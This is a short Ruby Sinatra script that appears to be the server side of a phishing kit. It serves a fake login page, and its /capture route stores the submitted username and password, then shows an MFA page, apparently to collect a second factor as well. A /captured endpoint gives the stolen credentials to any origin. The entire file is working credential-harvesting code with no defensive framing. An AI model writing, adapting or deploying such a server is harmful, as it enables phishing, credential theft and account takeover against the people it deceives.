#!/usr/bin/env ruby

require 'json'
require 'sinatra'

$values = 'none'.to_json

set :bind, '0.0.0.0'

get '/' do
  send_file 'public/index.html'
end

get '/captured' do
  headers 'Access-Control-Allow-Origin' => '*'
  $values
end

post '/capture' do
  $values = {login: params['UsernameForm'],
      passwd: params['PasswordForm'] }.to_json
  @email = params['UsernameForm']
  erb :mfa
end


